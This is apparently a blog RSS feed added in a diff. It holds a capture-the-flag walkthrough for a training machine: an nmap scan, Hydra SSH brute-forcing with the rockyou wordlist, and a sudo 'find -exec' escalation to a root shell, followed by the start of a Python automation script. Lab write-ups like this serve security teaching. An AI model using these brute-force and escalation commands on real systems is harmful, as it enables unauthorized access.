@@ -1,0 +1,436 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Onid1's blog</title><link>/en/post/</link><description>Recent content in Posts on Onid1's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 03 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="/en/post/index.xml" rel="self" type="application/rss+xml"/><item><title>[Facile - Linux] Chirucahua</title><link>/en/p/battlehack_chirucahua/</link><pubDate>Tue, 03 Oct 2023 00:00:00 +0000</pubDate><guid>/en/p/battlehack_chirucahua/</guid><description>&lt;img src="/en/p/battlehack_chirucahua/images/welcome_cover.jpg" alt="Featured image of post [Facile - Linux] Chirucahua" />&lt;h2 id="description">Description&lt;/h2>
+&lt;h2 id="données">Données&lt;/h2>
+&lt;h2 id="mode-normal">Mode Normal&lt;/h2>
+&lt;h3 id="reconnaissance">Reconnaissance&lt;/h3>
+&lt;h3 id="analyse-des-ports">Analyse des ports&lt;/h3>
+&lt;h2 id="mode-rapidité">Mode rapidité&lt;/h2></description></item><item><title>[Linux - Easy] TwoMillion</title><link>/en/p/htb_twomillion/</link><pubDate>Tue, 03 Oct 2023 00:00:00 +0000</pubDate><guid>/en/p/htb_twomillion/</guid><description>&lt;img src="/en/p/htb_twomillion/images/welcome_cover.jpg" alt="Featured image of post [Linux - Easy] TwoMillion" /></description></item><item><title>SSH Brutefore &amp; Sudo Find Privilege Escalation</title><link>/en/p/battlehack_welcome/</link><pubDate>Tue, 03 Oct 2023 00:00:00 +0000</pubDate><guid>/en/p/battlehack_welcome/</guid><description>&lt;img src="/en/p/battlehack_welcome/images/welcome_cover.jpg" alt="Featured image of post SSH Brutefore &amp; Sudo Find Privilege Escalation" />&lt;h2 id="description">Description&lt;/h2>
+&lt;blockquote>
+&lt;p>Welcome to the BattleH4cK platform. In this first mission, your instructor will guide you step by step to give you a glimpse of the game&amp;hellip; To enter the competition, you will have to demonstrate your skills. Can you connect yourself to this machine? It should be easy, but we are nice, so here are the information we know about it: The username should be seela The password used is weak&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="given-data">Given data&lt;/h2>
+&lt;p>By reading the description of the mission, we can see that we need to connect to the machine by knowing that:&lt;/p>
+&lt;ul>
+&lt;li>The username &lt;em>should&lt;/em> be &lt;strong>seela&lt;/strong>&lt;/li>
+&lt;li>The password &lt;em>used&lt;/em> is &lt;strong>weak&lt;/strong>&lt;/li>
+&lt;li>IP address: 10.42.20.52&lt;/li>
+&lt;/ul>
+&lt;h2 id="normal-mode">Normal Mode&lt;/h2>
+&lt;h3 id="port-scan">Port scan&lt;/h3>
+&lt;p>First, we need to know what services are open to us on the machine.
+To do this, we will use &lt;em>nmap&lt;/em>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">└─$ nmap 10.42.20.52 --script&lt;span class="o">=&lt;/span>default -sV
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Options explained:&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Option&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&amp;ndash;script=default&lt;/td>
+&lt;td>Performs a script scan using the default set of scripts.&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>-sV&lt;/td>
+&lt;td>Version detection&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.42.20.52
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.064s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class="o">(&lt;/span>protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> fe:c2:f2:9c:8f:17:5d:66:9a:90:c9:e9:b3:1a:0a:bc &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> ea:73:61:43:b8:7d:db:88:2b:d7:a8:16:39:49:b6:40 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> be:5e:54:f8:6d:3c:de:7d:53:17:99:08:65:0c:34:a0 &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 3.00 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We can see that there is one open port which is SSH.
+By remembering the given data, we have:&lt;/p>
+&lt;ul>
+&lt;li>a username which &lt;em>should&lt;/em> be &lt;strong>seela&lt;/strong>&lt;/li>
+&lt;li>a password which is &lt;em>used&lt;/em> is &lt;strong>weak&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>Before we continue, let&amp;rsquo;s look at the used verbs.
+There are &amp;ldquo;should&amp;rdquo; and &amp;ldquo;used&amp;rdquo;.
+When we look at the sentence about the password, there is the word &amp;ldquo;used&amp;rdquo; which is a bit confusing.
+There are two possibilities of interpretation:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>weak&lt;/strong> is the password&lt;/li>
+&lt;li>the password is weak, like to easy to guess&lt;/li>
+&lt;/ul>
+&lt;p>To know if the password is equal to &lt;strong>weak&lt;/strong>, we should try to connect with it and with the username &lt;strong>seela&lt;/strong>.
+(The username is not that confusing, because it doesn&amp;rsquo;t mean anything)&lt;/p>
+&lt;p>To connect to the machine by using our data, we can use &lt;strong>ssh&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">└─$ ssh seela@10.42.20.52
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">seela@10.42.20.54&lt;span class="err">&amp;#39;&lt;/span>s password: weak
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Permission denied, please try again.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>By being denied, we can understand that our password is not equal to &amp;ldquo;weak&amp;rdquo; but is weak, like easy to guess.&lt;/p>
+&lt;h3 id="bruteforce-seelas-password">Bruteforce seela&amp;rsquo;s password&lt;/h3>
+&lt;p>To find the password used by seela, as Google says, we can use an attack called &amp;ldquo;bruteforce&amp;rdquo;.
+&lt;img src="https://user-images.githubusercontent.com/69204254/216843124-4edabd84-d823-4160-99b9-cc1e70e4f314.png"
+loading="lazy"
+alt="image"
+>&lt;/p>
+&lt;p>In the first &lt;a class="link" href="https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/" target="_blank" rel="noopener"
+>link&lt;/a>, we can find that there is a tool called &amp;ldquo;Hydra&amp;rdquo; which can help us in this situation.
+We can find that there is a tool called &amp;ldquo;Hydra&amp;rdquo; which can help us in this situation.
+The website tells us that we need a username and a wordlist.
+To know what wordlist we should use, we can try to ask google which one can be good to try.
+&lt;img src="https://user-images.githubusercontent.com/69204254/216844703-e851e499-3d64-436c-aa13-1046feaed78f.png"
+loading="lazy"
+alt="image"
+>&lt;/p>
+&lt;p>By looking at the first link, we can read that the wordlist rockyou can be good to try.
+If you own a Kali Linux, rockyou can be found in /usr/share/wordlist/rockyou.txt.gz (you can also type the command: wordlists).&lt;/p>
+&lt;p>Right now, rockyou in gziped, to extract it, we can use &lt;strong>gunzip&lt;/strong>, by doing:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now we have a wordlist, let&amp;rsquo;s run Hydra !&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">└─$ hydra -l seela -P /usr/share/wordlists/rockyou.txt ssh://10.42.20.52 -t &lt;span class="m">4&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Options explained:&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Option&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>-l LOGIN&lt;/td>
+&lt;td>or -L FILE login with LOGIN name, or load several logins from FILE&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>-P FILE&lt;/td>
+&lt;td>or -P FILE try password PASS, or load several passwords from FILE&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>-t TASKS&lt;/td>
+&lt;td>run TASKS number of connects in parallel (default: 16)&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Hydra v9.3 &lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> &lt;span class="m">2022&lt;/span> by van Hauser/THC &lt;span class="p">&amp;amp;&lt;/span> David Maciejak - Please &lt;span class="k">do&lt;/span> not use in military or secret service organizations, or &lt;span class="k">for&lt;/span> illegal purposes &lt;span class="o">(&lt;/span>this is non-binding, these *** ignore laws and ethics anyway&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>DATA&lt;span class="o">]&lt;/span> max &lt;span class="m">16&lt;/span> tasks per &lt;span class="m">1&lt;/span> server, overall &lt;span class="m">16&lt;/span> tasks, &lt;span class="m">14344399&lt;/span> login tries &lt;span class="o">(&lt;/span>l:1/p:14344399&lt;span class="o">)&lt;/span>, ~896525 tries per task
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>DATA&lt;span class="o">]&lt;/span> attacking ssh://10.42.20.54:22/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>22&lt;span class="o">][&lt;/span>ssh&lt;span class="o">]&lt;/span> host: 10.42.20.54 login: seela password: rockyou
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> of &lt;span class="m">1&lt;/span> target successfully completed, &lt;span class="m">1&lt;/span> valid password found
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We got our password, which &lt;strong>rockyou&lt;/strong> !&lt;/p>
+&lt;p>Let&amp;rsquo;s try to connect to the machine the same way we used to do:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">└─$ ssh seela@10.42.20.52
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">seela@10.42.20.54&lt;span class="err">&amp;#39;&lt;/span>s password: rockyou
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;em>Result:&lt;/em>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Linux welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw 5.15.0-39-generic &lt;span class="c1">#42-Ubuntu SMP Thu Jun 9 23:42:32 UTC 2022 x86_64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The programs included with the Debian GNU/Linux system are free software&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">the exact distribution terms &lt;span class="k">for&lt;/span> each program are described in the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">individual files in /usr/share/doc/*/copyright.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">permitted by applicable law.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As we can see, we are now connected !
+The first flag is in the directory in which we are:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ ls -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Options explained:&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Option&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>-l&lt;/td>
+&lt;td>use a long listing format&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>&lt;em>Result:&lt;/em>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">total &lt;span class="m">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> root root &lt;span class="m">17&lt;/span> Feb &lt;span class="m">5&lt;/span> 20:23 user.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Let&amp;rsquo;s get the content of the &lt;code>user.txt&lt;/code> flag.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">└─$ cat user.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;em>Result:&lt;/em>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">FLAG&lt;span class="o">{&lt;/span>someCharacters&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="privilege-escalation">Privilege Escalation&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ sudo -l
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">We trust you have received the usual lecture from the &lt;span class="nb">local&lt;/span> System
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator. It usually boils down to these three things:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#1) Respect the privacy of others.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#2) Think before you type.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#3) With great power comes great responsibility.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> seela: rockyou
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Options Explained:&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Option&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>-l&lt;/td>
+&lt;td>Lists the allowed (and forbidden) commands for the invoking user on the current host.&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> seela on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass, &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin&lt;span class="se">\:&lt;/span>/usr/local/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin&lt;span class="se">\:&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User seela may run the following commands on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> /usr/bin/find *
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As we can see, using sudo, we can run the command find with any parameters, as the user &lt;code>root&lt;/code>.
+Initially, find is used to find things on the system. But, when we take a look at its manual, we can use many options.&lt;/p>
+&lt;p>Right now, we would like to become &lt;code>root&lt;/code> or read the &lt;code>/root/root.txt&lt;/code> flag.
+To do this, let&amp;rsquo;s search for options which can do one of those.&lt;/p>
+&lt;p>Once we have read the manual, we can speak about one: &lt;code>-exec&lt;/code>.&lt;/p>
+&lt;p>Option &lt;code>-exec&lt;/code> will allow us to exec a command when a searched file is found.
+Here, we would like to read the content of &lt;code>/root/root.txt&lt;/code>.&lt;/p>
+&lt;p>To do this, we can execute the following command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo find /root/root.txt -exec cat &lt;span class="o">{}&lt;/span> &lt;span class="se">\;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Which gives us the final flag.&lt;/p>
+&lt;p>If we want, we can also get a root shell, by using the following command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo find / -exec bash &lt;span class="se">\;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="speedrun-mode">Speedrun mode&lt;/h2>
+&lt;p>In this mode, our goal is to solve the machine as quickly as possible.
+To achieve this, I&amp;rsquo;ve created a python script (not necessarily the fastest language) that automates our various resolution actions.&lt;/p>
+&lt;p>*The machine launch and flag validation scripts are not included.
+*Only the machine resolution script will be given.&lt;/p>
+&lt;p>First of all, we need to take note of the machine resolution process.
+First, we looked up the password for the user &lt;code>seela&lt;/code>.
+We then connected to the remote server via SSH, using the credentials we&amp;rsquo;d obtained, and retrieved our first flag.
+Once connected, we checked the rights of user &lt;code>seela&lt;/code> to discover that he can run the &lt;code>find&lt;/code> command as &lt;code>root&lt;/code>.
+We finished the machine by displaying the contents of the &lt;code>/root/root.txt&lt;/code> flag.&lt;/p>
+&lt;p>The aim of this section is to extract from our initial process the steps required to resolve the machine.&lt;/p>
+&lt;h3 id="taking-shortcuts">Taking shortcuts&lt;/h3>
+&lt;p>In this section, we list the various shortcuts we&amp;rsquo;ve taken to save as much time as possible:&lt;/p>
+&lt;ul>
+&lt;li>after relaunching the machine, we observe that the password remains the same. This means we won&amp;rsquo;t need to run the bruteforce step again.&lt;/li>
+&lt;li>instead of searching for the two flags separately, we can use a single command.&lt;/li>
+&lt;/ul>
+&lt;h3 id="searching-for-modules">Searching for modules&lt;/h3>
+&lt;p>In order to access the machine&amp;rsquo;s SSH service, two modules were selected:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.paramiko.org/" target="_blank" rel="noopener"
+>paramiko&lt;/a>: one of the best-known libraries for connecting remotely to another computer using SSHv2&lt;/li>
+&lt;li>&lt;a class="link" href="https://pypi.org/project/ssh2-python/" target="_blank" rel="noopener"
+>ssh2-python&lt;/a>: a remote SSHv2 connection library that claims to be &amp;ldquo;very fast&amp;rdquo;.&lt;/li>
+&lt;/ul>
+&lt;p>The choice of these two modules was seen in a comparative aspect. A script for each module was set up. For my part, I found the &lt;code>ssh2-python&lt;/code> module faster than &lt;code>paramiko&lt;/code>.&lt;/p>
+&lt;h3 id="script-used">Script used&lt;/h3>
+&lt;p>A resolution script was designed with the help of the ssh2-python module.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
